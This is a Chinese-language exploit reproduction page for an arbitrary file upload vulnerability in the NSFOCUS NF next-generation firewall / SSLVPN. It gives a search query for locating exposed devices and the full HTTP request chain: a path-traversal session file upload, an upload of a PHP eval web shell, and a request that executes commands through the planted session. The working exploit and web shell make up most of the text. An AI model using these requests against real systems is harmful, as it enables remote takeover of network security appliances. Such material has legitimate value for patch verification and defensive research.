# 绿盟 NF下一代防火墙 任意文件上传漏洞

## 漏洞描述

绿盟 SSLVPN 存在任意文件上传漏洞，攻击者通过发送特殊的请求包可以获取服务器权限，进行远程命令执行

## 漏洞影响

<a-checkbox checked>绿盟 SSLVPN </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="NSFOCUS-下一代防火墙"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1658884417477-a47362c4-646d-464e-a094-9e36a53165d6.png)

出现漏洞的端口为 8081 

```python
POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9
Host: 

--1d52ba2a11ad8a915eddab1a0e85acd9
Content-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac71"

lang|s:52:"../../../../../../../../../../../../../../../../tmp/";

--1d52ba2a11ad8a915eddab1a0e85acd9--
```

![image-20230812085235711](../../../.vuepress/public/img/image-20230812085235711.png)

```python
POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
Host: 

--4803b59d015026999b45993b1245f0ef
Content-Disposition: form-data; name="file"; filename="compose.php"


<?php eval($_POST['cmd']);?>

--4803b59d015026999b45993b1245f0ef--
```

![image-20230812085349551](../../../.vuepress/public/img/image-20230812085349551.png)



```python
POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
Host: 

--4803b59d015026999b45993b1245f0ef
Content-Disposition: form-data; name="file"; filename="compose.php"


<?php eval($_POST['cmd']);?>

--4803b59d015026999b45993b1245f0ef--
```

![img](../../../.vuepress/public/img/1684385511983-b0ced531-df95-4ca9-a34f-f0704fe7e98d.png)

```python
POST /mail/include/header_main.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
Host:

cmd=phpinfo();
```